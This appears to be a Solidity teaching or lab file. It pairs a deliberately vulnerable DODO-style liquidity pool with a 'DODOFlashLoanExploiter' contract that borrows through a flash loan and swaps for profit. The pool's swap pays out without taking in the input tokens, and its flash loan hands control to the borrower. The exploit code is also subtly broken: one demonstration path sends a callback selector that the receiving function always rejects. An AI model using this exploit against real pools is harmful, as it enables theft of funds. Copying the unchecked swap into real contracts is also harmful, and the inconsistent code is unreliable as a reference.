// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableDODOPool {
    address public tokenA;
    address public tokenB;
    uint256 public reserveA;
    uint256 public reserveB;

    constructor(address _tokenA, address _tokenB) {
        tokenA = _tokenA;
        tokenB = _tokenB;
        reserveA = 1000 ether;
        reserveB = 1000 ether;
    }

    function flashLoan(
        address borrower,
        address token,
        uint256 amount,
        bytes calldata data
    ) external {
        require(token == tokenA || token == tokenB, "Invalid token");

        uint256 balanceBefore = IERC20(token).balanceOf(address(this));

        IERC20(token).transfer(borrower, amount);

        IDODOCallee(borrower).dodoCall(msg.sender, amount, data);

        uint256 balanceAfter = IERC20(token).balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan not returned");
    }

    function swap(address fromToken, uint256 amountIn) external returns (uint256 amountOut) {
        if (fromToken == tokenA) {
            amountOut = (amountIn * reserveB) / (reserveA + amountIn);

            reserveA += amountIn;
            reserveB -= amountOut;

            IERC20(tokenB).transfer(msg.sender, amountOut);
        } else {
            amountOut = (amountIn * reserveA) / (reserveB + amountIn);
            reserveB += amountIn;
            reserveA -= amountOut;
            IERC20(tokenA).transfer(msg.sender, amountOut);
        }
    }

    function addLiquidity(uint256 amountA, uint256 amountB) external {
        IERC20(tokenA).transferFrom(msg.sender, address(this), amountA);
        IERC20(tokenB).transferFrom(msg.sender, address(this), amountB);
        reserveA += amountA;
        reserveB += amountB;
    }

    function checkInvariant() external view returns (bool) {
        return (IERC20(tokenA).balanceOf(address(this)) == reserveA &&
                IERC20(tokenB).balanceOf(address(this)) == reserveB);
    }
}

contract DODOFlashLoanExploiter {
    VulnerableDODOPool public pool;
    address public tokenA;
    address public tokenB;

    constructor(address _pool) {
        pool = VulnerableDODOPool(_pool);
        tokenA = pool.tokenA();
        tokenB = pool.tokenB();
    }

    function executeAttack() external returns (uint256 profit) {
        uint256 loanAmount = 500 ether;

        uint256 initialBalance = IERC20(tokenA).balanceOf(address(this));

        pool.flashLoan(
            address(this),
            tokenA,
            loanAmount,
            abi.encode(this.performArbitrage.selector, loanAmount)
        );

        uint256 finalBalance = IERC20(tokenA).balanceOf(address(this));
        profit = finalBalance - initialBalance;

        assembly {
            log1(0, 0, profit)
        }

        return profit;
    }

    function dodoCall(
        address sender,
        uint256 amount,
        bytes calldata data
    ) external {
        require(msg.sender == address(pool), "Only pool can call");

        (bytes4 selector, uint256 loanAmount) = abi.decode(data, (bytes4, uint256));
        require(selector == this.performArbitrage.selector, "Invalid selector");

        this.performArbitrage(loanAmount);

        require(
            IERC20(tokenA).transfer(address(pool), amount),
            "Failed to repay flash loan"
        );
    }

    function performArbitrage(uint256 loanAmount) external returns (uint256) {
        uint256 initialA = IERC20(tokenA).balanceOf(address(this));

        IERC20(tokenA).approve(address(pool), loanAmount);

        uint256 amountB = pool.swap(tokenA, loanAmount);

        return amountB;
    }

    function demonstrateVulnerability(uint256 loanAmount) external returns (bool) {
        uint256 reserveA_before = pool.reserveA();
        uint256 reserveB_before = pool.reserveB();

        pool.flashLoan(
            address(this),
            tokenA,
            loanAmount,
            abi.encode(this.checkDesync.selector, loanAmount)
        );

        uint256 reserveA_after = pool.reserveA();
        uint256 actualBalanceA = IERC20(tokenA).balanceOf(address(pool));

        return (actualBalanceA != reserveA_after);
    }

    function checkDesync(uint256 loanAmount) external {
        uint256 reserveA = pool.reserveA();
        uint256 actualBalanceA = IERC20(tokenA).balanceOf(address(pool));

        require(actualBalanceA > reserveA, "No desync detected");

        IERC20(tokenA).transfer(address(pool), loanAmount);
    }

    function getBalances() external view returns (uint256 balanceA, uint256 balanceB) {
        balanceA = IERC20(tokenA).balanceOf(address(this));
        balanceB = IERC20(tokenB).balanceOf(address(this));
    }
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IDODOCallee {
    function dodoCall(address sender, uint256 amount, bytes calldata data) external;
}
